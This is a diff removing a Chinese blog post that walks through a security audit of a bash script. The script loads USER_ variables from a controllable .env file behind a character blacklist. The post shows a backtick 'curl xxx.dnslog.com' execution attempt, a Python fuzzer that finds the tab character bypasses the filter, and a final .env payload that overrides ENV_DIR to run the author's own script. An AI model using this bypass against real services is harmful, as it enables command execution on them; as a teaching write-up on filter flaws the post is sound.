-          <a href="/2020-12-27-Bash%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1Case/" class="post-title-link" itemprop="url">Bash代码审计Case</a>
-        </h2>
-
-        <div class="post-meta-container">
-          <div class="post-meta">
-    <span class="post-meta-item">
-      <span class="post-meta-item-icon">
-        <i class="far fa-calendar"></i>
-      </span>
-      <span class="post-meta-item-text">发表于</span>
-      
-
-      <time title="创建时间：2020-12-27 12:09:53 / 修改时间：18:20:10" itemprop="dateCreated datePublished" datetime="2020-12-27T12:09:53+08:00">2020-12-27</time>
-    </span>
-
-  
-</div>
-
-        </div>
-      </header>
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-          <h1 id="问题背景"><a href="#问题背景" class="headerlink" title="问题背景"></a>问题背景</h1><p>我在一次安全评估过程中，幸运地遇到了一个可以污染环境变量的漏洞点。</p>
-<p>不过因为开发工程师做了黑名单字符的判断，所以并不能很容易地利用。</p>
-<p>服务是使用bash脚本编写的，漏洞点的代码片段如下。其中<code>$PROJECT_DIR</code>目录下我可以创建任意文件，并且<code>$PROJECT_DIR/.env</code>文件内容是我完全可控的</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if [ -f &quot;$PROJECT_DIR&#x2F;.env&quot; ]; then</span><br><span class="line">    # 过滤所有特殊字符，并只保留所有USER_前缀的环境变量，避免用户变量污染</span><br><span class="line">    echo &quot;加载用户自定义环境变量&quot;</span><br><span class="line">    cat $PROJECT_DIR&#x2F;.env | grep &#39;^USER_.*&#39; | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39;</span><br><span class="line">    export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)   # 使用字符黑名单做的限制,不允许使用  ;)(&#96;|&amp; 任何一个字符</span><br><span class="line">    echo &quot;&quot;</span><br><span class="line">fi</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">source $ENV_DIR   # 执行另外一个脚本</span><br></pre></td></tr></table></figure>
-
-<p>业务使用者正常情况下，会在<code>$PROJECT_DIR/.env</code>文件写入下面这种格式的内容。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">USER_X&#x3D;1</span><br><span class="line">USER_Y&#x3D;2</span><br></pre></td></tr></table></figure>
-<p>每一行以USER_开头，被解析成环境变量给后续的程序使用。</p>
-<p>我尝试将 <code>$PROJECT_DIR/.env</code> 文件内容写成下面这样，来命令执行或者造成环境变量污染</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#96;curl xxx.dnslog.com&#96;   # &#96;&#96;来命令执行</span><br><span class="line"> new_variable&#x3D;11    # 用空格分割来注入新的环境变量</span><br></pre></td></tr></table></figure>
-<p>因为代码中的字符黑名单的限制，所以都无法成功。</p>
-<p>到这里的时候，我只能看看下面这行代码存不存绕过，能让我污染环境变量。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export $(grep -v &#39;^#&#39; $PROJECT_DIR&#x2F;.env | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; | xargs)</span><br></pre></td></tr></table></figure>
-
-<p>如果可以污染环境变量，就修改 ENV_DIR变量为我指定的文本路径，来执行我的脚本，从而达到命令执行的效果。</p>
-<h1 id="解题过程"><a href="#解题过程" class="headerlink" title="解题过程"></a>解题过程</h1><p>我的想法是找下有没有不在黑名单的字符，能够让我生成新的变量。</p>
-<p>于是就写了简单的程序跑一下：遍历所有单字节的字符，如果能够生成新的XXX变量，就打印这个字符。</p>
-<p>代码如下</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in range(1,256):</span><br><span class="line">    path &#x3D; &quot;&#x2F;tmp&#x2F;env&quot; + str(i)</span><br><span class="line">    with open(path, &quot;w&quot;) as f:</span><br><span class="line">        f.write(&quot;USER_X&#x3D;Y&quot; + chr(i) + &quot;XXX&#x3D;YY&quot;)</span><br><span class="line">    cmd &#x3D; &quot;&quot;&quot;export $(grep -v &#39;^#&#39; %s | grep -v &#39;^.*[ ;)(&#96;|&amp;].*$&#39; | grep &#39;^USER_.*&#39; | sed &#39;s&#x2F; &#x2F;&#x2F;g&#39; 2&gt;&#x2F;dev&#x2F;null | xargs) 1&gt;&#x2F;dev&#x2F;null 2&gt;&amp;1 ;echo %s;env|grep -i &quot;^XXX&quot;|wc -l&quot;&quot;&quot; % (path, str(i))</span><br><span class="line">    with open(&quot;&#x2F;tmp&#x2F;1.sh&quot;, &quot;w&quot;) as f:</span><br><span class="line">        f.write(cmd)</span><br><span class="line">    os.system(&quot;bash &#x2F;tmp&#x2F;1.sh&quot;)</span><br></pre></td></tr></table></figure>
-
-<p>结果 \x09 也就是 \t 可以生成新变量。</p>
-<p>所以我控制 $PROJECT_DIR/.env 内容为</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\tENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh</span><br></pre></td></tr></table></figure>
-<p>就可以让服务执行我的my.sh脚本。注意这里的  <code>\t</code>是 \x09 字符。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">with open(&quot;.env&quot;) as f:</span><br><span class="line">    f.write(&quot;\x09ENV_DIR&#x3D;&#x2F;PROJECT_DIR_ABSOLUATE_PATH&#x2F;my.sh&quot;)</span><br></pre></td></tr></table></figure>
-
-
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>这个case能造成命令执行的最初原因是开发工程师漏掉了 \x09 字符，而 \x09 字符也可以被xargs命令用来作为分隔符号。</p>
-<p>另外，在判断有没有字符能够突破某某限制时，用遍历的思想让程序去找，实现简单且效果很好。</p>
-<p>当我在写这篇总结的时候，发现man xargs手册中已经很清楚地说明了xargs会以 空格、tab按键、换行、EOF字符作为分割。或许后面在评估过程中，想测试命令是否存在安全问题前应该看看man手册的说明。</p>
 
       
     </div>
